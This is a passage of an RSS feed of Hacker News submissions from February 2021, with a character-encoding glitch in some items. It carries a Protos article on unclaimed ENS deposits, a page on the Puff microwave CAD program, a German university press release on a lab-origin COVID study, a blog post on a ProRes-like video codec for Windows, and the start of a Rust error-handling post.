<p>Their original owners can <strong>reclaim deposits</strong> by signing a transaction with the <a href="https://protos.com/ethereum-price-high-record-1100-days-bitcoin-cryptocurrency/" target="_blank" rel="noreferrer noopener">Ethereum</a> address that sent them.</p>
<p>Lead developer Nick Johnson told Protos that darkmarket.eth was the <strong>highest priced auction</strong> when ENS first launched, ‚Äúso this is definitely the largest amount‚Äù waiting to be reclaimed.&nbsp;</p>
<p>But <strong>who owns</strong> this mega-stash of ENS deposits?&nbsp;</p>
<figure><img loading="lazy" width="1024" height="651" src="https://protos.com/wp-content/uploads/2021/02/Screenshot-2021-02-18-at-15.47.50-1024x651.png" alt="ens, ethereum" srcset="https://protos.com/wp-content/uploads/2021/02/Screenshot-2021-02-18-at-15.47.50-1024x651.png 1024w, https://protos.com/wp-content/uploads/2021/02/Screenshot-2021-02-18-at-15.47.50-300x191.png 300w, https://protos.com/wp-content/uploads/2021/02/Screenshot-2021-02-18-at-15.47.50-768x488.png 768w, https://protos.com/wp-content/uploads/2021/02/Screenshot-2021-02-18-at-15.47.50-1536x977.png 1536w, https://protos.com/wp-content/uploads/2021/02/Screenshot-2021-02-18-at-15.47.50.png 1552w" sizes="(max-width: 1024px) 100vw, 1024px" data-pagespeed-url-hash="3657046761" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"><figcaption>ENS offers a reclaim service <a href="https://reclaim.ens.domains/" target="_blank" rel="noreferrer noopener">via its website</a>.</figcaption></figure>
<p>Nobody knows, but their <a href="https://etherscan.io/address/0x8759b0b1d9cba80e3836228dfb982abaa2c48b97" target="_blank" rel="noreferrer noopener">blockchain history</a> shows they‚Äôre sitting on 63,734 ETH ($122.2 million).</p>
<p>They‚Äôre also active (kinda). Darkmarket.eth‚Äôs owner sent 1,600 ETH ($3 million) to an <strong>Ethereum mixing service</strong> around three months ago, and made five ERC-20 transactions in the past year.</p>
<p>Whoever it is, they could be $76 million richer ‚Äî if only they‚Äôd sign for it.</p>
<p><strong>Edit 16:59 UTC, Feb 18: </strong>Clarification about annual ENS leases in the seventh paragraph.</p>
</div>
</main>
</article></div>]]>
            </description>
            <link>https://protos.com/ethereum-name-service-ens-whale-deposits-crypto-darkmarket/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191481</guid>
            <pubDate>Fri, 19 Feb 2021 10:22:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Puff microwave CAD software on Linux]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26191480">thread link</a>) | @gballan
<br/>
February 19, 2021 | https://www.pa3fwm.nl/software/puff/ | <a href="https://web.archive.org/web/*/https://www.pa3fwm.nl/software/puff/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<a href="http://www.its.caltech.edu/~mmic/puff.html">PUFF</a> is
the name of a computer aided design program for microwave circuits,
developed at the California Institute of Technology. It allows one
to easily edit a circuit and calculate and plot the circuit's
scattering parameters. It was originally created under MS-DOS
in the 1980s and 1990s, and distributed for a modest fee together
with a manual and sourcecode.
Since late 2000, this web page contained information on how to
compile it under Linux.

<p>
In early 2010, the original program was made available under the
GPLv3 license, and therefore a complete Linux package is now
available for free here, including the original manual:
<a href="https://www.pa3fwm.nl/software/puff/puff-20181104.tgz">here it is</a>.

</p><p>
Here's a screenshot:</p>

<p><img src="https://www.pa3fwm.nl/software/puff/puff.png" alt="[screenshot]"></p>
<hr>
<p> Feedback is welcome, by e-mail to <a href="mailto:pa3fwm@amsat.org">pa3fwm@amsat.org</a>.
<br><small>Copyright ¬© 2000-2018.</small>
<br><a href="https://www.pa3fwm.nl/software/">Back to PA3FWM's amateur-radio software page</a></p>



</div>]]>
            </description>
            <link>https://www.pa3fwm.nl/software/puff/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191480</guid>
            <pubDate>Fri, 19 Feb 2021 10:22:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[German Physicist professor says evidence points to Covid escaped from lab]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26191355">thread link</a>) | @dominik-2020
<br/>
February 19, 2021 | https://www.uni-hamburg.de/newsroom/presse/2021/pm8.html | <a href="https://web.archive.org/web/*/https://www.uni-hamburg.de/newsroom/presse/2021/pm8.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><img alt="Prof. Dr. Roland Wiesendanger" src="https://assets.rrz.uni-hamburg.de/instance_assets/uni/15056328/wisendanger-733x414-screen-6a3135136ea4c8abccd4c1a6e9d4b3b49f85e7e1.jpg"></p><p>Foto: Sebastian Engels</p><p>Prof. Dr. Roland Wiesendanger</p></div><p>Seit mehr als einem Jahr sorgt das Coronavirus f√ºr eine weltweite Krise. In einer Studie hat nun der Nanowissenschaftler Prof. Dr. Roland Wiesendanger den Ursprung des Virus beleuchtet. Er kommt zu dem Ergebnis, dass sowohl die Zahl als auch die Qualit√§t der Indizien f√ºr einen Laborunfall am virologischen Institut der Stadt Wuhan als Ursache der gegenw√§rtigen Pandemie sprechen.</p><p>Die Studie wurde im Zeitraum von Januar 2020 bis Dezember 2020 durchgef√ºhrt. Sie basiert auf einem interdisziplin√§ren wissenschaftlichen Ansatz sowie auf einer umfangreichen Recherche unter Nutzung verschiedenster Informationsquellen. Hierzu geh√∂ren unter anderem wissenschaftliche Literatur, Artikel in Print- und Online-Medien sowie pers√∂nliche Kommunikation mit internationalen Kolleginnen und Kollegen. Sie liefert keine hochwissenschaftlichen Beweise, wohl aber zahlreiche und schwerwiegende Indizien:</p>
<ul>
<li>Im Gegensatz zu fr√ºheren Coronaviren-bedingten Epidemien wie SARS und MERS konnte bis heute, d. h. weit √ºber ein Jahr nach Ausbruch der gegenw√§rtigen Pandemie, kein Zwischenwirtstier identifiziert werden, welches die √úbertragung von SARS-CoV-2-Erregern von Flederm√§usen auf den Menschen erm√∂glicht haben k√∂nnte. Die Zoonose-Theorie als m√∂gliche Erkl√§rung f√ºr die Pandemie besitzt daher keine fundierte wissenschaftliche Grundlage.</li>
<li>Die SARS-CoV-2-Viren k√∂nnen erstaunlich gut an menschliche Zellrezeptoren ankoppeln und in menschliche Zellen eindringen. Erm√∂glicht wird dies durch spezielle Zellrezeptor-Bindungsdom√§nen verbunden mit einer speziellen (Furin-)Spaltstelle des Coronavirus-Zacken-Proteins. Beide Eigenschaften zusammen waren bislang bei Coronaviren nicht bekannt und weisen auf einen nicht-nat√ºrlichen Ursprung des SARS-CoV-2-Erregers hin.</li>
<li>Flederm√§use wurden nicht auf dem in Verdacht geratenen Fischmarkt im Zentrum der Stadt Wuhan angeboten. Im virologischen Institut der Stadt Wuhan gibt es jedoch eine der weltweit gr√∂√üten Sammlungen von Fledermauserregern, welche von weit entfernten H√∂hlen in s√ºdchinesischen Provinzen stammen. Es ist extrem unwahrscheinlich, dass sich Flederm√§use aus dieser Entfernung von nahezu 2.000 km auf nat√ºrliche Weise auf den Weg nach Wuhan begeben haben, um dann in unmittelbarer N√§he dieses virologischen Instituts eine weltweite Pandemie auszul√∂sen.</li>
<li>Eine Forschungsgruppe am virologischen Institut der Stadt Wuhan hat √ºber viele Jahre hinweg gentechnische Manipulationen an Coronaviren vorgenommen mit dem Ziel, diese f√ºr Menschen ansteckender, gef√§hrlicher und t√∂dlicher zu machen. Dies ist in der wissenschaftlichen Fachliteratur durch zahlreiche Publikationen belegt.</li>
<li>Es existierten erhebliche Sicherheitsm√§ngel im virologischen Institut der Stadt Wuhan bereits vor Ausbruch der Coronavirus-Pandemie, welche dokumentiert sind.</li>
<li>Es gibt zahlreiche direkte Hinweise auf einen Laborursprung des SARS-CoV-2 Erregers. So soll sich eine junge Wissenschaftlerin des virologischen Instituts in Wuhan als erste infiziert haben. Es gibt ferner zahlreiche Hinweise darauf, dass sich bereits im Oktober 2019 der SARS-CoV-2 Erreger ausgehend von dem virologischen Institut in der Stadt Wuhan und dar√ºber hinaus verbreitet hat. Ferner gibt es Hinweise auf eine entsprechende Untersuchung des virologischen Instituts durch die chinesischen Beh√∂rden in der ersten Oktoberh√§lfte 2019.&nbsp; &nbsp;</li>
</ul>
<p>&nbsp;‚ÄûDie gegenw√§rtige Coronavirus-Pandemie beherrscht nicht nur die derzeitigen Schlagzeilen, sondern wird uns noch √ºber viele Jahre hinweg besch√§ftigen ‚Äì nicht zuletzt aufgrund der sozialen und wirtschaftlichen Auswirkungen. Seit Monaten steht verst√§ndlicherweise der Umgang mit und die Bew√§ltigung von der Corona-Krise im Vordergrund der Themen in der Politik und in den Medien. Von gro√üer Bedeutung ist jedoch schon heute die kritische wissenschaftsbasierte Auseinandersetzung mit der Frage nach dem Ursprung der derzeitigen Pandemie, denn nur auf Basis dieses Wissens k√∂nnen ad√§quate Vorkehrungen getroffen werden, die Wahrscheinlichkeit f√ºr das Auftreten √§hnlicher Pandemien in Zukunft so klein wie m√∂glich zu halten‚Äú, sagt Prof. Dr. Roland Wiesendanger.</p>
<p>Die Studie wurde im Januar 2021 fertiggestellt und zun√§chst in Wissenschaftskreisen verteilt und diskutiert. Mit der Ver√∂ffentlichung soll nun eine breit angelegte Diskussion angeregt werden, insbesondere im Hinblick auf die ethischen Aspekte der sogenannten ‚Äûgain-of-function‚Äú-Forschung, welche Krankheitserreger f√ºr Menschen ansteckender, gef√§hrlicher und t√∂dlicher macht. ‚ÄûDies kann nicht l√§nger nur Angelegenheit einer kleinen Gruppe von Wissenschaftlerinnen und Wissenschaftlern bleiben, sondern muss dringend Gegenstand einer √∂ffentlichen Debatte werden‚Äú, so der Autor der Studie.&nbsp;</p>
<p>Die Studie ist ver√∂ffentlicht unter: <a href="http://doi.org/10.13140/RG.2.2.31754.80323" target="_blank">http://doi.org/10.13140/RG.2.2.31754.80323</a></p><p><a target="_blank" href="https://www.uni-hamburg.de/newsroom/presse/2021/pm8/pm-8-21.pdf">Pressemitteilung als PDF</a></p></div></div></div>]]>
            </description>
            <link>https://www.uni-hamburg.de/newsroom/presse/2021/pm8.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191355</guid>
            <pubDate>Fri, 19 Feb 2021 10:00:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I made a PRORES-lookalike for Windows]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26191274">thread link</a>) | @CinematicStudio
<br/>
February 19, 2021 | https://cinematicstudio.app/blog/prores.html | <a href="https://web.archive.org/web/*/https://cinematicstudio.app/blog/prores.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <div>
                <div>
					
					<div>
					<h2>
					I made a PRORES-lookalike for Windows
					</h2>



					
					
					<h2>Preface ‚Äì What is PRORES?
					</h2>
					<p>
PRORES is a line of intermediate codecs, which means they are intended for use during video editing, and not for practical end-user viewing. It‚Äôs been developed by Apple, back in 2007 (<a href="https://en.wikipedia.org/wiki/Apple_ProRes" target="_blank">Wikipedia</a>).
</p>


					<h2>Why did I do it?
					</h2>
					<div><p>
There have been several reasons, but it all boils down to: I got very frustrated with the implementation of the Windows decoders when dealing with .mp4 (h264 and h265 codecs) ‚Äì which are pretty much 98% of all videos out there.<br>

Since I‚Äôm actually developing a <a href="https://cinematicstudio.app/" target="_blank">video editor</a>, when it comes to loading video frames in memory, you can:<br>
1. use <a href="https://docs.microsoft.com/en-us/uwp/api/windows.media.playback.mediaplayer?view=winrt-19041" target="_blank">MediaPlayer</a> class, from Microsoft<br>
2. use <a href="https://ffmpeg.org/" target="_blank">ffmpeg</a></p><p>


MediaPlayer is unreliable and slow <a href="#n1">[1]</a>. And, wait for it, it has Video RAM memory leaks <a href="#n2">[2]</a>.<br>

Using ffmpeg: Most advice on the internet ‚Äì whether you can use ffmpeg in a commercial app or not ‚Äì ends with ‚Äúbut I‚Äôm not a lawyer‚Äù. I chose to avoid it, at least at the beginning <a href="#n3">[3]</a>. </p><p>

I initially went with using MediaPlayer. This frustrated me (and a lot of my users) a lot, making my app close to impossible to use in certain scenarios. Like, what if I want to play a video backwards, at 3x speed? What I‚Äôd do is cache that specific video segment ahead of time ‚Äì which not only did take a lot of RAM, but it also made my app show the ‚ÄúLoading‚Äù icon when you would press Play ‚Äì until I would pre-load all such segments.</p><p>

At some point I painfully realized: if I don‚Äôt do something similar to PRORES, I‚Äôm screwed. Clearly, the first idea was ‚Äì what if I could use the codecs from Apple? Spoiler alert: you can‚Äôt. <br>

So, what else could I do? Develop my own!

</p></div>





					<h2>Lets see the numbers!
					</h2>
					<div><p>
Well, I can‚Äôt say it was easy to develop this. I had to get creative quite a few times. But once I realized there‚Äôs really no way around it, I stuck with it. And I‚Äôve created some limitations, just to make sure frames will load up insanely fast.</p><p>

When you hit Play, the video project will strive to play at 60 frames / second ‚Äì even if your video project is 30 fps or something else. </p><p>

What this basically means, I have 16.66 milliseconds to load everything that‚Äôs needed (which if you have several video layers, means loading several video frames) and apply video effects on top of that. And, play the sound, of course.</p><p>

We can relax this requirement a bit, because even if the video project would play at 30 frames / second, it would still look smooth to you. So, I have 33.33 milliseconds tops to load all needed video frames and apply video effects on top of that.</p><p>

Applying video effects, such as blur, directional blur, masking, lighting takes an insane amount of time. By doing a lot of trial and error, I chose to do it like this ‚Äì I will show the video at 640 x 360 (no, it‚Äôs not as low res as you may think <a href="#n4">[4]</a>). This will make frame loading very fast, and the video effects will be fast as well. I will improve upon this <a href="#n5">[5]</a>.</p><p>

Complicated video effects can take up to 5ms on a decent GPU. They take slightly longer on older GPUs, but it‚Äôs still decent. It can take up to 9ms on an Nvidia Quadro M600M with 2GB of RAM (a 5-year old video card). Compounding video effects (several effects on top of each other) will be a bit harder <a href="#n6">[6]</a>.</p><p>

This still leaves us with 24.33 milliseconds to load video frames. In my tests, I load one video frame in 2ms on an Nvidia Geforce RTX 2070, and 3.45ms on Nvidia Quadro M600M. So, worst case scenario, I could still load 6-7 video frames in time for drawing them on-screen.</p><p>

One thing to note is that you will need a decent SSD for this to happen. Or, do a ‚Äúsacrifice play‚Äù ‚Äì basically hit Play, and this will be a bit slower the first time, so that Windows will be able to cache the video files in memory.
					
</p></div>


					<h2>Creating the PRORES-lookalike files
					</h2>
					<div><p>
When you import a video file, I will automatically create the PRORES-lookalike file. There‚Äôs no point in using MediaPlayer until the PRORES-lookalike is complete ‚Äì it would drain further resources (Memory + CPU + GPU) with very little gains.</p><p>

One thing I do, while creating the PRORES-lookalike, I will keep in memory the first 3.5 minutes of the video, thus, you can still have a decent preview in real-time while I‚Äôm doing this.</p><p>

To give you the numbers, it‚Äôs not something set in stone, it depends on the video I‚Äôm converting. It will range between 15-18 times faster than duration of the video on my Geforce RTX 2070 card. So for instance, it takes roughly 3:20 minutes to process a 1 hour video.</p></div>


					<h2>Behind the scenes
					</h2>
					<p>
What I‚Äôm doing is something remarkably simple, and after running a lot of tests, I realized it‚Äôs enough, at least for now. It‚Äôs similar to <a href="https://en.wikipedia.org/wiki/Motion_JPEG" target="_blank">Motion JPEG</a>, with the difference that I‚Äôm in control 100%. In other words, I always get to decide when each video frame is loaded and how long it stays in memory.					
</p>


					<h2>Is this battle tested?
					</h2>
					<p>
Yes! I‚Äôve had this in production since late September 2020. I‚Äôve done a few tweaks along the way, but the core code is the same.</p>


					<h2>How does it compare with ffmpeg?
					</h2>
					<p>
My take is that it‚Äôs 6-10 times faster. I‚Äôve looked into it in the last few days, but I can‚Äôt do a proper test just yet. I‚Äôve used <a href="https://github.com/unosquare/ffmediaelement" target="_blank">FFMediaElement library</a> to do some testing, but I can‚Äôt get it to use GPU (I did ask in the forum, will publish the results once I have them). At this time, for a 4K video, my results indicate processing a video frame takes 77ms on the CPU on my machine with the Geforce video card. I assume the GPU should be 5-7 times faster, thus it would likely take somewhere between 11-15ms, compared to 2ms for me.
</p>

					<h2>How does it compare with Apple PRORES?
					</h2>
					<div><p>
Honestly, I don‚Äôt know. I would say it should be roughly on-par, since I‚Äôm pretty sure the underlying concepts should be similar. It may be that Apple might generate the PRORES files faster, I‚Äôm not sure. But accessing them, I would say we should see similar times.</p><p>

If anyone wants to test this ‚Äì you‚Äôd need a machine with both MacOS and Windows 10 ‚Äì , drop me an email at <a href="mailto:cinematic@cinematicstudio.com">cinematic@cinematicstudio.com</a> I can easily allow turning on statistics that would show you the average video frame loading time.</p><p>

John @ Cinematic Studio</p></div>






					<h2>Notes
					</h2>
					<div>
<p>[1] For one thing, when you seek to a frame, you‚Äôre not entirely sure you‚Äôve actually gotten there, in <b>VideoFrameAvailable</b> event ‚Äì because of how they internally do caching. So even if Microsoft tells you you‚Äôre there, well you‚Äôre not. To give you an example, say you‚Äôre at position 10.5 seconds, and you want to go to position 20.1 seconds. When you receive the first 2-3 <b>VideoFrameAvailable</b> events, what you may get is frames at position 10.5 seconds, and at some point, you‚Äôll start receiving frames at position 20.1 seconds. </p><p>

In practice, I‚Äôve found out that 5 frames seems to be a safe bet ‚Äì in other words, I would go to position 20.1 seconds ‚Äì 5 frames, then simply ignore the first 5 frames. Even though in practice I never met a case when you would still get an invalid frame after the first 5 frames, it doesn‚Äôt really mean it can‚Äôt happen. This gets even worse if you need to do several seeks at very small intervals.</p><p>

There‚Äôs no way to go several frames ahead. You can only <b>StepForwardOneFrame()</b> and <b>StepBackwardOneFrame()</b>. In practice, going backward is roughly 5 times slower.</p><p>

Having several <b>MediaPlayer</b> instances doesn‚Äôt help things either ‚Äì in practice, I noticed that the more instances I would have, the slower everything got.</p><p>

Sometimes, I would get an infinite amount of <b>VideoFrameAvailable</b> events, because, that‚Äôs how Microsoft rolls.

<a name="n2"></a></p><p>[2] Finally, <b>VideoFrameAvailable</b> has memory leaks. I found this out the hard way ‚Äì from one user being very, lets say, frustrated. At Export, within 60-70 seconds, it sometimes could end eating up 8GB of video RAM when dealing with 4K footage.

<a name="n3"></a></p><p>[3] I‚Äôve pondered about using ffmpeg more times than I can count. </p><p>

There‚Äôs a lot of mambo jambo about whether/how you can use this in commercial code, because MPEG LA holds the patent for it ‚Äì so even if you use your own implementation, you‚Äôd still need to pay MPEG LA. It didn't really sit right with me. It's also unclear to me how they would figure out the number of "downloaded copies".</p><p>

I‚Äôve done another round of searching lately, and I‚Äôm in talks with <a href="https://x264.org/en/" target="_blank">x264</a> It seems I need to  obtain a license from them, in order to compile ffmpeg to use LGPL (thus, be able to use it commercially) ‚Äì this would be on top of what I'd pay MPEG LA.</p><p>

I won‚Äôt get my hopes up until I receive a quote from them ‚Äì the fact that you need to request a quote makes me think they‚Äôll do their best to milk you as much as possible.

<a name="n4"></a></p><p>[4] I can hear you screaming ‚Äì that‚Äôs sooo low res! Turns out it‚Äôs not. If you come to think about it, most of the time the video takes less than ¬º of the screen, the rest being occupied by the timeline, and other panes. And in the future, I will allow you to select a higher resolution, such as 1280 x 720, or simply 1920 x 1080 if you‚Äôve got some hard core video card.

<a name="n5"></a></p><p>[5] The next steps will be: once you settle on one video frame (you pause the project, and do some editing), to show the video frame at Full HD (1920 x 1080). It‚Äôs not as easy as you‚Äôd think, but I can do it :) 

<a name="n6"></a></p><p>[6] The more video effects you compound (one video effect on top of another, on top of another, and so on), the more GPU is needed. One of the reasons I chose to go with 640 x 360 resolution is that this gives a quite reasonable number of compound effects that can be played in real time. On a decent video card, you won‚Äôt really need any pre-rendering ahead of time (which pretty much breaks your flow).
					
</p></div>
					
	
					</div>
                </div>
            </div>
        </section></div>]]>
            </description>
            <link>https://cinematicstudio.app/blog/prores.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191274</guid>
            <pubDate>Fri, 19 Feb 2021 09:44:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where Everything Went Wrong: Error Handling and Error Messages in Rust (2020)]]>
            </title>
            <description>
<![CDATA[
Score 148 | Comments 181 (<a href="https://news.ycombinator.com/item?id=26191006">thread link</a>) | @lukastyrychtr
<br/>
February 19, 2021 | https://msirringhaus.github.io/Where-everything-went-wrong/ | <a href="https://web.archive.org/web/*/https://msirringhaus.github.io/Where-everything-went-wrong/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><strong>Today you are frustrated.</strong></p>

<p>This is so annoying. You√¢‚Ç¨‚Ñ¢ve written a Rust crate and now that you want to test it for the very first time, <em>it doesn√¢‚Ç¨‚Ñ¢t work!</em></p>

<p>Come on, Rust! How dare you? You promised that once one gets past the compiler, it.<br>
<em>Just.<br>
<strong>Works!</strong></em><br>
And now this!</p>

<p>Ok, ok. You calm yourself down. Lets start from the beginning. You want to create so called <a href="https://docs.sentry.io/platforms/native/guides/minidumps/">minidumps</a>. This is a file that contains information about a crashed program (like stacks of all threads, CPU registers, system info, etc.).
The minidump consists of various sections, such as the minidump header (including time of day, versions and basically a table of contents), a thread section (including all threads of the process and their stacks), memory mappings and libraries, etc. [Just to give some context, as all of this is actually not really important.]</p>

<p>For this, you created a <a href="https://github.com/msirringhaus/minidump_writer_linux">crate</a>. One section gets written after the other, while information about the targeted process is retrieved from the system. You even created a nice, simple API. You hand in a process ID and an open file, where the minidump should be written to. like this:</p>

<div><div><pre><code>    <span>MinidumpWriter</span><span>::</span><span>new</span><span>(</span><span>pid</span><span>,</span> <span>blamed_thread</span><span>)</span>
        <span>.dump</span><span>(</span><span>&amp;</span><span>mut</span> <span>dump_file</span><span>)</span>
        <span>.expect</span><span>(</span><span>"Dumping failed!"</span><span>)</span>
</code></pre></div></div>

<p>You can also hand in user specified memory regions that should be included in the dump, like so:</p>

<div><div><pre><code>    <span>let</span> <span>app_memory</span> <span>=</span> <span>AppMemory</span> <span>{</span>
        <span>ptr</span><span>:</span> <span>some_address</span><span>,</span>
        <span>length</span><span>:</span> <span>memory_size</span><span>,</span>
    <span>};</span>

    <span>MinidumpWriter</span><span>::</span><span>new</span><span>(</span><span>pid</span><span>,</span> <span>pid</span><span>)</span>
        <span>.set_app_memory</span><span>(</span><span>vec!</span><span>[</span><span>app_memory</span><span>])</span>
        <span>.dump</span><span>(</span><span>&amp;</span><span>mut</span> <span>tmpfile</span><span>)</span>
        <span>.expect</span><span>(</span><span>"Dumping failed"</span><span>);</span>
</code></pre></div></div>



<p>But when you run your nice library code in an application, you get <code>'Dumping failed: "Failed in ptrace::read: Sys(EIO)"'</code>.</p>

<p><em>How useless is that?!</em></p>

<p>Okay, maybe you could enhance your library error handling, a little. And by enhance, you mean √¢‚Ç¨≈ìimplement one in the first place√¢‚Ç¨ÔøΩ.</p>

<h2 id="state-of-the-dart">State of the dart</h2>

<p>Your current approach is to define</p>

<div><div><pre><code><span>type</span> <span>Error</span> <span>=</span> <span>Box</span><span>&lt;</span><span>dyn</span> <span>error</span><span>::</span><span>Error</span> <span>+</span> <span>std</span><span>::</span><span>marker</span><span>::</span><span>Send</span> <span>+</span> <span>std</span><span>::</span><span>marker</span><span>::</span><span>Sync</span><span>&gt;</span><span>;</span>
<span>pub</span> <span>type</span> <span>Result</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>result</span><span>::</span><span>Result</span><span>&lt;</span><span>T</span><span>,</span> <span>Error</span><span>&gt;</span><span>;</span>
</code></pre></div></div>

<p>and using <code>Result&lt;T&gt;</code> in all of your functions as the return value and handing all of them to the parent function using <code>?</code>. Thus the original error pierces through your callstack like a dart through√¢‚Ç¨¬¶.jelly (Yes, you are good with words and you know it.).</p>

<div><div><pre><code>    <span>pub</span> <span>fn</span> <span>init</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>()</span><span>&gt;</span> <span>{</span>
        <span>self</span><span>.read_auxv</span><span>()</span><span>?</span><span>;</span>
        <span>self</span><span>.enumerate_threads</span><span>()</span><span>?</span><span>;</span>
        <span>self</span><span>.enumerate_mappings</span><span>()</span><span>?</span><span>;</span>
        <span>Ok</span><span>(())</span>
    <span>}</span>
</code></pre></div></div>

<p>In Rust parlance, this is also called bubbling up errors.</p>

<p>Usually, you just bubble up errors from libraries you use, but for the rare errors you have to define yourself, you currently just do</p>
<div><div><pre><code><span>Err</span><span>(</span><span>"Found no auxv entry"</span><span>.into</span><span>())</span>
</code></pre></div></div>

<p>Well, now you know there is an error, at least. And that it has <em>something</em> to do with your usage of <code>ptrace</code>. But you have no idea where that happens. You use that functionality in various places. Is it during the init-phase? During one of the sections? And if so, which one? What are you trying to read? And from where? Or in short: <strong>What is going on?!</strong></p>

<h2 id="shoes-off-get-some-tea-research-time">Shoes off, get some tea: Research time!</h2>

<p>Well, Rust has been around for quite some time now and they always boast about how error handling is a first class citizen and all that. So error handling should be a done deal, right? With a canonical way of dealing with errors, officially documented and all that should be right there, correct?</p>

<p>Oh boy, were you wrong.</p>

<p>Turns out, this is a very active field of√¢‚Ç¨¬¶mh√¢‚Ç¨¬¶experimentation, lets say. There has been <a href="https://blog.yoshuawuyts.com/error-handling-survey/">a survey</a> recently, listing and quickly describing most the different libraries and ways for error handling that emerged, fallen out of favor, got forked, died anyways, got superseded, fallen out of favor again, etc.
And the opinions seem to change frequently, if you should use <code>error-chain</code> or <code>failure</code> or <code>fehler</code> or <code>snafu</code> or <code>thiserror</code> or <code>anyhow</code> or <code>eyre</code> or√¢‚Ç¨¬¶</p>

<p>You opened a can of hornets there, or whatever that saying is.</p>

<p>Then you find <a href="https://blog.rust-lang.org/inside-rust/2020/11/23/What-the-error-handling-project-group-is-working-on.html">this gem</a> and don√¢‚Ç¨‚Ñ¢t know if you should laugh or cry. Almost six years after Rust hit 1.0 an error handling project group is formed. Six. Years. <em>(heavy breathing)</em></p>

<p>Well, okay. At least they are sorting it out now. Problem is, you need√¢‚Ç¨¬¶.<em>SIX YEARS? Are you serious?</em>√¢‚Ç¨¬¶ahem, sorry√¢‚Ç¨¬¶Problem is, you need helpful error messages now.</p>

<p>After reading a few decent blogs on the topic (like <a href="http://www.sheshbabu.com/posts/rust-error-handling/">this</a> or <a href="https://nick.groenen.me/posts/rust-error-handling/">that</a>), there seems to emerge a consensus, at least for libraries: Return something that derives from <code>std::error::Error</code>. Either implement them by hand, or use a crate that does it for you, using macro magic. like <code>thiserror</code>. Which method you use depends on your level of laziness plus your patience regarding compile times.</p>

<h2 id="examples-vs-reality">Examples vs. Reality</h2>

<p>Another post highlighted <a href="https://doc.rust-lang.org/rust-by-example/error/multiple_error_types/wrap_error.html">error wrapping</a>, a particularly intriguing idea to you.</p>

<p>Unfortunately, all the articles have the understandable, but rather annoying tendency to use very simple example code for illustration purposes. Unrealistically simple, you might even say. They have callstacks of depth 1, return only three kinds of error in total in their API, and their errors are obvious and easily describable (e.g. √¢‚Ç¨≈ìInput file XY not found in your √¢‚Ç¨Àúcounting words√¢‚Ç¨‚Ñ¢ program√¢‚Ç¨ÔøΩ).</p>

<p>You have a more complicated callstack, with tons of different errors and code reuse in different places. For example, the function you think is to blame for the above error is <code>copy_from_process()</code>, which calls <code>ptrace::read()</code>, which probably returns something like <code>Failed in ptrace::read: Sys(EIO)</code>.
This function is used in multiple places in your code, e.g.:</p>

<div><div><pre><code>√¢‚Äù≈ì√¢‚Äù‚Ç¨ init()
√¢‚Äù‚Äö   √¢‚Äù≈ì√¢‚Äù‚Ç¨ read_auxv()
√¢‚Äù‚Äö   √¢‚Äù‚Äö  √¢‚Äù≈ì√¢‚Äù‚Ç¨ open(format!("/proc/{}/auxv", self.pid))
√¢‚Äù‚Äö   √¢‚Äù‚Äö  √¢‚Äù‚Äù√¢‚Äù‚Ç¨ some_parsing()
√¢‚Äù‚Äö   √¢‚Äù≈ì√¢‚Äù‚Ç¨ ...
√¢‚Äù‚Äö   √¢‚Äù≈ì√¢‚Äù‚Ç¨ enumerate_mappings()
√¢‚Äù‚Äö   √¢‚Äù‚Äö  √¢‚Äù≈ì√¢‚Äù‚Ç¨ open(format!("/proc/{}/maps", self.pid))
√¢‚Äù‚Äö   √¢‚Äù‚Äö  √¢‚Äù‚Äù√¢‚Äù‚Ç¨ some_parsing()
√¢‚Äù‚Äö   √¢‚Äù‚Äö
√¢‚Äù‚Äö   √¢‚Äù‚Äù√¢‚Äù‚Ç¨ some_more_checks()
√¢‚Äù‚Äö      √¢‚Äù‚Äù√¢‚Äù‚Ç¨ copy_from_process()
√¢‚Äù‚Äö
√¢‚Äù‚Äù√¢‚Äù‚Ç¨ dump()
   √¢‚Äù‚Äö
   √¢‚Äù≈ì√¢‚Äù‚Ç¨ sections::header::write()
   √¢‚Äù‚Äö
   √¢‚Äù≈ì√¢‚Äù‚Ç¨ sections::thread_list_stream::write()
   √¢‚Äù‚Äö  √¢‚Äù‚Äù√¢‚Äù‚Ç¨ copy_from_process()
   √¢‚Äù‚Äö
   √¢‚Äù≈ì√¢‚Äù‚Ç¨ sections::mappings::write()
   √¢‚Äù‚Äö  √¢‚Äù‚Äù√¢‚Äù‚Ç¨ elf_identifier_for_mapping()
   √¢‚Äù‚Äö     √¢‚Äù‚Äù√¢‚Äù‚Ç¨ copy_from_process()
   √¢‚Äù‚Äö
   √¢‚Äù≈ì√¢‚Äù‚Ç¨ sections::app_memory::write()
   √¢‚Äù‚Äö  √¢‚Äù‚Äù√¢‚Äù‚Ç¨ copy_from_process()
   √¢‚Äù‚Äö
   √¢‚Äù‚Äù√¢‚Äù‚Ç¨ ...
</code></pre></div></div>

<p>Same goes for opening files, which happens in multiple places (two examples of which are shown in <code>init()</code>), so getting <code>FileNotFound</code> without context is going to be equally fun, and so on.</p>



<p>Wrapping errors still sounds like a nice idea, but one layer alone is not going to <del>wrap it</del> cut it.
Going with <code>copy_from_process()</code> as an example, you see a few possibilities:</p>
<ol>
